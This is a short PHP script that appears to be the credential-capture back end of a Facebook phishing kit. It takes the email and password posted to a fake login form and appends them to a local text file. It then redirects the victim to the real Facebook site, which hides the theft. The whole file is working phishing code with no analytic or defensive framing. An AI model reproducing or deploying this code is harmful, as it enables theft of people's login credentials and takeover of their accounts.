<?php
header("Location: https://www.facebook.com/");
$ADEx = "./mk/ancor.txt";
$ran = rand(10,1000000000000);
$ADEy = $_POST['email'];
$ADEz = $_POST['pass'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "$ran|$ADEy|$ADEz|$c");
fwrite($handle, "\n");
fclose($handle);
exit;
?>